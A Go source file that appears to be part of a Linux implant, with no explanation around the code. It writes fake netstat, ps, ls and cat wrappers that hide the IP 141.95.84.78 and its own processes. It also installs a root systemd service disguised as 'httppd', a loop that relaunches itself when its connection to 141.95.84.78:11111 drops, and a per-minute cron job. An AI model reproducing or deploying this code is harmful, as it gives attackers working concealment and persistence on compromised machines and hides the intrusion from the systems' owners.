package main

import (
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"os/user"
)

func get_user() string {

	u, _ := user.Current()
	return u.Username

}

func replace() error {
	netstat := []byte("# !/bin/bash\n/usr/bin/netstat $@ | grep -Ev '141.95.84.78'")
	ps := []byte("# !/bin/bash\n/usr/bin/ps $@ | grep -Ev 'httppd|start|" + os.Args[0] + "'")
	ls := []byte("# !/bin/bash\n/usr/bin/ls $@ | grep -Ev 'httppd|start|" + os.Args[0] + "'")
	cat := []byte("# !/bin/bash\n/usr/bin/cat $@ | grep -Ev 'httppd|start|" + os.Args[0] + "'")
	err := ioutil.WriteFile("/usr/local/bin/netstat", netstat, 0777)
	err1 := ioutil.WriteFile("/usr/local/bin/ps", ps, 0777)
	err2 := ioutil.WriteFile("/usr/local/bin/ls", ls, 0777)
	err3 := ioutil.WriteFile("/usr/local/bin/cat", cat, 0777)

	if err != nil {
		return err
	}
	if err1 != nil {
		return err
	}
	if err2 != nil {
		return err
	}
	if err3 != nil {
		return err
	}
	return nil
}

func auto_reboot() error {
	content := []byte("[Unit]\nDescription=httppd Server Service\n[Service]\nType=simple\nRestart=always\nRestartSec=1\nUser=root\nExecStart=/etc/start_httpd.sh\n[Install]\nWantedBy=multi-user.target")
	err := ioutil.WriteFile("/etc/systemd/system/httppd.service", content, 0770)
	cmd := exec.Command("bash", "-c", "systemctl enable httppd.service")
	cmd.Run()
	if err != nil {
		return err
	}
	return nil
}

func cron_create() error {
	name := os.Args[0]
	newfile, err := os.Create("/etc/httppd")
	if err != nil {
		return err
	}
	oldfile, err := os.OpenFile(name, os.O_RDONLY, 0600)
	if err != nil {
		return err
	}
	contentByte, err := ioutil.ReadAll(oldfile)
	if err != nil {
		return err
	}
	p, err := newfile.Write(contentByte)
	_ = p
	if err != nil {
		return err
	}
	os.Chmod("/etc/httppd", 0777)
	cron_file := "#!/bin/bash\n"
	cron_file += "while true; do\n"
	cron_file += "    NUM=`netstat -antup | grep '141.95.84.78:11111' | grep ESTABLISHED | wc -l`\n"
	cron_file += "	  if [ \"${NUM}\" -lt \"1\" ];then\n"
	cron_file += "	  	  /etc/httppd\n"
	cron_file += "	  fi\n"
	cron_file += "	  sleep 10\n"
	cron_file += "done\n"

	cron, err := os.Create("/etc/start_httpd.sh")
	os.Chmod("/etc/start_httpd.sh", 0777)
	if err != nil {
		return err
	}
	n, err := io.WriteString(cron, cron_file)

	_ = n

	if err != nil {
		return err
	}
	pathname := "/var/spool/cron/" + get_user()
	erer := ioutil.WriteFile(pathname, []byte("* * * * * /etc/httppd"), 0777)
	if erer != nil {
		return erer
	}
	cmd := exec.Command("bash", "-c", "systemctl start crond.service")
	cmd.Run()
	cmd1 := exec.Command("bash", "-c", "service crond start")
	cmd1.Run()
	newfile.Close()
	oldfile.Close()
	cron.Close()
	return nil
}
